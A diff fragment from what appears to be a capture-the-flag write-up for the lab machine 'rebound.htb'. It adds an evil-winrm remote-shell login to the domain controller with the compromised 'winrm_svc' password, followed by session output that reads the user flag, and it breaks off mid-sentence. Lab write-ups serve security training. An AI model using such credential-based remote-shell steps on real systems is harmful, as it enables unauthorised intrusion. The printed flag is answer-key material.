@@ -308,5 +308,32 @@ SMB         10.129.14.17    445    DC01             [+] rebound.htb\winrm_svc:Pa
 ```
 This user is now compromised
 
+# Evil-winrm as `winrm_svc`
+```python
+evil-winrm -i dc01.rebound.htb -u 'winrm_svc' -p 'Password123!'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> dir
 
+
+    Directory: C:\Users\winrm_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         4/4/2026   1:49 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
+70c59b857470aef4bc448f0275c90502
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> 
+```
+I now 
 
